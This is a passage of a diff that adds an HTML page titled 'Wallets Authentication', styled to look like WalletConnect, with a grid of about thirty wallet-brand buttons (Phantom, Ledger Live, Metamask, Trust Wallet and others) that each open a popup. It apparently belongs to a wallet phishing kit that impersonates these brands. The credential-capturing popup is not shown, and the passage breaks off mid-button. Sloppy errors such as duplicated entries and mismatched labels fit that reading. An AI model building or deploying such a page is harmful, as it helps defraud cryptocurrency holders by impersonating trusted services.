@@ -1,0 +1,2566 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <title data-react-helmet="true">Wallets Authentication</title>
+  <link href="main.css" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Chicle&family=Farsan&family=Roboto+Condensed:ital,wght@0,100..900;1,100..900&family=Zen+Dots&display=swap"
+    rel="stylesheet">
+</head>
+
+<body>
+
+
+  <header class="ant-layout-header" style="background: white; 
+       height: 70px; 
+       position: fixed; 
+       z-index: 100; 
+       width: 100%; 
+       padding: 0px 30px;
+       box-shadow: 0 4px 8px rgba(0,0,0,0.2);">
+    <nav class="flex items-center noselect" style="max-width: 1200px; 
+            margin: 0 auto; 
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;">
+      <!-- Remove flex-1 div and center the logo -->
+      <a class="logo" href="index.html" style="display: flex; align-items: center;">
+        <div class="logo-icon">
+          <!-- <img src="logo/lg/wallet-connect.jpg" alt=""> --> Wallet Connect
+        </div>
+      </a>
+    </nav>
+  </header>
+  <div id="___gatsby">
+    <div style="height: 50px;"></div>
+    <div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper">
+      <div class="layout__SWrapper-wjwiqk-0 dijnUu">
+        <div class="layout__SFlex-wjwiqk-3 hfVnjX">
+          <div class="layout__SContent-wjwiqk-1 fiuMUO">
+            <div class="layout__SContainer-wjwiqk-2 fuQfHo">
+              <div class="pageStyles__SIndexPage-sc-1navawn-0 hDbjSS">
+                <div class="pageStyles__SBrandingWrapper-sc-1navawn-1 fAmUdU" style="margin-bottom: 5px;">
+                  <h1 class="pageStyles__SBranding-sc-1navawn-2 gFeYHJ" style="margin-bottom: 8px; 
+                         font-weight: 900; 
+                         color: #000000;
+                         text-shadow: 0.5px 0 #000000;
+                         letter-spacing: 0.5px;
+                         -webkit-font-smoothing: antialiased;">
+                    Connect Wallet
+                  </h1>
+                </div>
+                <div class="pageStyles__SPageDescription-sc-1navan-3 jGHRMl"
+                  style="margin-top: 8px; margin-bottom: 15px;">
+                  Open protocol for connecting Wallets to Dapps
+                </div>
+                <section class="pageStyles__SSection-sc-1navawn-4 ibLsRQ">
+
+
+                  <div class="Grid__SGrid-sc-8d5rqj-0 gAVVCu">
+                    <!--==========================================================-->
+                    <button onclick="showPopup('Wallet Connect')" style="
+                                          background: none; 
+                                          border: none; 
+                                          padding: 8px; 
+                                          display: flex; 
+                                          flex-direction: column; 
+                                          align-items: center; 
+                                          justify-content: center;
+                                          text-align: center;
+                                          cursor: pointer;
+                                          width: fit-content;
+                                          margin: 0 auto;
+                                        ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/iogo.jpg.jpeg" alt="Wallet Connect"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Wallet Connect
+                        </div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Phantom')" style="
+                      background: none; 
+                      border: none; 
+                      padding: 8px; 
+                      display: flex; 
+                      flex-direction: column; 
+                      align-items: center; 
+                      justify-content: center;
+                      text-align: center;
+                      cursor: pointer;
+                      width: fit-content;
+                      margin: 0 auto;
+                    ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/phan.png" alt="Phantom"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Phantom</div>
+                      </div>
+                    </button>
+
+
+                    <!-- Adding Ledger Live as third option -->
+                    <button onclick="showPopup('Ledger Live')" style="
+                                        background: none; 
+                                        border: none; 
+                                        padding: 8px; 
+                                        display: flex; 
+                                        flex-direction: column; 
+                                        align-items: center; 
+                                        justify-content: center;
+                                        text-align: center;
+                                        cursor: pointer;
+                                        width: fit-content;
+                                        margin: 0 auto;
+                                      ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/ledger_live.png" alt="Ledger Live"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Ledger Live</div>
+                      </div>
+                    </button>
+
+
+                    <button onclick="showPopup('metamask')" style="
+                                        background: none; 
+                                        border: none; 
+                                        padding: 8px; 
+                                        display: flex; 
+                                        flex-direction: column; 
+                                        align-items: center; 
+                                        justify-content: center;
+                                        text-align: center;
+                                        cursor: pointer;
+                                        width: fit-content;
+                                        margin: 0 auto;
+                                      ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq "
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons"
+                            src="logo/lg/c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96.jpg.jpeg"
+                            alt="Trust Wallet" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Metamask</div>
+                      </div>
+                    </button>
+                    <!-- Adding Mycelium as fifth option -->
+                    <button onclick="showPopup('Mycelium')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/mycelium.jpg.jpeg" alt="Mycelium"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Mycelium</div>
+                      </div>
+                    </button>
+
+                    <!-- Adding Exodus as sixth option -->
+                    <button onclick="showPopup('Exodus Wallet')" style="
+                                        background: none; 
+                                        border: none; 
+                                        padding: 8px; 
+                                        display: flex; 
+                                        flex-direction: column; 
+                                        align-items: center; 
+                                        justify-content: center;
+                                        text-align: center;
+                                        cursor: pointer;
+                                        width: fit-content;
+                                        margin: 0 auto;
+                                      ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/exodus-wallet.png" alt="Exodus"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Exodus Wallet</div>
+                      </div>
+                    </button>
+
+                    <!-- Solar Wallet -->
+                    <button onclick="showPopup('Solar Wallet')" style="
+                                        background: none; 
+                                        border: none; 
+                                        padding: 8px; 
+                                        display: flex; 
+                                        flex-direction: column; 
+                                        align-items: center; 
+                                        justify-content: center;
+                                        text-align: center;
+                                        cursor: pointer;
+                                        width: fit-content;
+                                        margin: 0 auto;
+                                      ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/solar-wallet.png" alt="Solar Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Solar Wallet</div>
+                      </div>
+                    </button>
+
+                    <!-- Monerujo -->
+                    <button onclick="showPopup('Monerujo')" style="
+                                        background: none; 
+                                        border: none; 
+                                        padding: 8px; 
+                                        display: flex; 
+                                        flex-direction: column; 
+                                        align-items: center; 
+                                        justify-content: center;
+                                        text-align: center;
+                                        cursor: pointer;
+                                        width: fit-content;
+                                        margin: 0 auto;
+                                      ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/monerujo.png" alt="Monerujo"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Monerujo</div>
+                      </div>
+                    </button>
+
+                    <!-- Coinbase Wallet -->
+                    <button onclick="showPopup('Coinbase Wallet')" style="
+                                        background: none; 
+                                        border: none; 
+                                        padding: 8px; 
+                                        display: flex; 
+                                        flex-direction: column; 
+                                        align-items: center; 
+                                        justify-content: center;
+                                        text-align: center;
+                                        cursor: pointer;
+                                        width: fit-content;
+                                        margin: 0 auto;
+                                      ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/coinbase.png" alt="Coinbase Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Coinbase Wallet</div>
+                      </div>
+                    </button>
+                    <!-- Adding Atomic Wallet after Mycelium -->
+                    <button onclick="showPopup('Loopring')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/loopring.png" alt="Loopring"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Loopring</div>
+                      </div>
+                    </button>
+
+                    <!-- Montero GUI -->
+                    <button onclick="showPopup('Montero GUI')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/montero-gui.png" alt="Montero GUI"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Montero GUI</div>
+                      </div>
+                    </button>
+
+                    <!-- One Key -->
+                    <button onclick="showPopup('One Key')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/onekey.png" alt="One Key"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">One Key</div>
+                      </div>
+                    </button>
+
+                    <!-- Bit Frost -->
+                    <button onclick="showPopup('Bit Frost')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/bitfrost.png" alt="Bit Frost"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Bit Frost</div>
+                      </div>
+                    </button>
+
+                    <!-- Flare -->
+                    <button onclick="showPopup('Flare')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/flare.png" alt="Flare"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Flare</div>
+                      </div>
+                    </button>
+
+                    <!-- Bitcoin.com -->
+                    <button onclick="showPopup('Bitcoin.com')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/bitcoin.png" alt="Bitcoin.com"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Bitcoin.com</div>
+                      </div>
+                    </button>
+
+                    <!-- Ton Wallet -->
+                    <button onclick="showPopup('Ton Wallet')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/ton.png" alt="Ton Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Ton Wallet</div>
+                      </div>
+                    </button>
+
+                    <!-- Ton Keeper -->
+                    <button onclick="showPopup('Ton Keeper')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/ton-keeper.png" alt="Ton Keeper"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Ton Keeper</div>
+                      </div>
+                    </button>
+
+                    <!-- Keepkey -->
+                    <button onclick="showPopup('Keepkey')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/keepkey.png" alt="Keepkey"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Keepkey</div>
+                      </div>
+                    </button>
+
+                    <!-- Elipal -->
+                    <button onclick="showPopup('Elipal')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/elipal.png" alt="Elipal"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Elipal</div>
+                      </div>
+                    </button>
+
+                    <!-- Uniswap -->
+                    <button onclick="showPopup('Uniswap')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/uniswap.png" alt="Uniswap"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Uniswap</div>
+                      </div>
+                    </button>
+
+                    <!-- Argent -->
+                    <button onclick="showPopup('Argent')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/argent.png" alt="Argent"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Argent</div>
+                      </div>
+                    </button>
+
+                    <!-- Youholder -->
+                    <button onclick="showPopup('Youholder')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/youhandler.png" alt="Youholder"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Youholder</div>
+                      </div>
+                    </button>
+
+                    <!-- BitBox -->
+                    <button onclick="showPopup('BitBox')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/bitbox.png" alt="BitBox"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">BitBox</div>
+                      </div>
+                    </button>
+
+                    <!-- Coldcard Wallet -->
+                    <button onclick="showPopup('Coldcard Wallet')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/coolcard.png" alt="Coldcard Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Coldcard Wallet</div>
+                      </div>
+                    </button>
+
+                    <!-- Trust Wallet -->
+                    <button onclick="showPopup('Trust Wallet')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/trust-wallet-66f8777532931d9c09b633344981a6a9.png"
+                            alt="Trust Wallet" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Trust Wallet</div>
+                      </div>
+                    </button>
+
+                    <!-- KeyStone -->
+                    <button onclick="showPopup('KeyStone')" style="
+                                                            background: none; 
+                                                            border: none; 
+                                                            padding: 8px; 
+                                                            display: flex; 
+                                                            flex-direction: column; 
+                                                            align-items: center; 
+                                                            justify-content: center;
+                                                            text-align: center;
+                                                            cursor: pointer;
+                                                            width: fit-content;
+                                                            margin: 0 auto;
+                                                          ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/keystone.png" alt="KeyStone"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">KeyStone</div>
+                      </div>
+                    </button>
+
+                    <!-- Simplehold Button -->
+                    <button onclick="showPopup('Simplehold')" style="
+                    background: none; 
+                    border: none; 
+                    padding: 8px; 
+                    display: flex; 
+                    flex-direction: column; 
+                    align-items: center; 
+                    justify-content: center;
+                    text-align: center;
+                    cursor: pointer;
+                    width: fit-content;
+                    margin: 0 auto;
+                    ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq "
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/simplehold.png" alt="Simplehold"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Simplehold</div>
+                      </div>
+                    </button>
+
+                    <!-- MyEther Button -->
+                    <button onclick="showPopup('MyEther')" style="
+                    background: none; 
+                    border: none; 
+                    padding: 8px; 
+                    display: flex; 
+                    flex-direction: column; 
+                    align-items: center; 
+                    justify-content: center;
+                    text-align: center;
+                    cursor: pointer;
+                    width: fit-content;
+                    margin: 0 auto;
+                    ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq "
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/myether.png" alt="MyEther"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">MyEther</div>
+                      </div>
+                    </button>
+
+                    <!-- BitBox Button -->
+                    <button onclick="showPopup('BitBox')" style="
+                    background: none; 
+                    border: none; 
+                    padding: 8px; 
+                    display: flex; 
+                    flex-direction: column; 
+                    align-items: center; 
+                    justify-content: center;
+                    text-align: center;
+                    cursor: pointer;
+                    width: fit-content;
+                    margin: 0 auto;
+                    ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq "
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/bitbox.png" alt="BitBox"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">BitBox</div>
+                      </div>
+                    </button>
+
+                    <!-- Infiniti Button -->
+                    <button onclick="showPopup('Infiniti')" style="
+                    background: none; 
+                    border: none; 
+                    padding: 8px; 
+                    display: flex; 
+                    flex-direction: column; 
+                    align-items: center; 
+                    justify-content: center;
+                    text-align: center;
+                    cursor: pointer;
+                    width: fit-content;
+                    margin: 0 auto;
+                    ">
+                      <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq "
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/infinit.png" alt="Infiniti"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
